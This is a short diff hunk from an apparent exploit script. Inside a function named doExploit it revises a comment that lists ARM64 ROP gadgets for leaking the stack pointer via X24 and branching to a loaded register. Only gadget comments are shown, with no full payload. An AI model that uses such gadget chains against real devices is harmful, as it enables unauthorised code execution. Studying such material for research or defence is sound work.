@@ -253,7 +253,7 @@ function doExploit(buf, stale, temp) {
 			.text:000000000039FEF8 40 00 1F D6                 BR              X2      ; Branch To Register
 		*/
 		/*
-			Second gadget: assuming known X8, leak SP via X24 and branch to 
+			Second gadget: assuming known X8, grab X9 value, leak SP via X24, and branch to X9
 		
 			.text:00000000003E2724                 LDR             X9, [X8,#0x30]
 			.text:00000000003E2728                 MOV             X8, SP
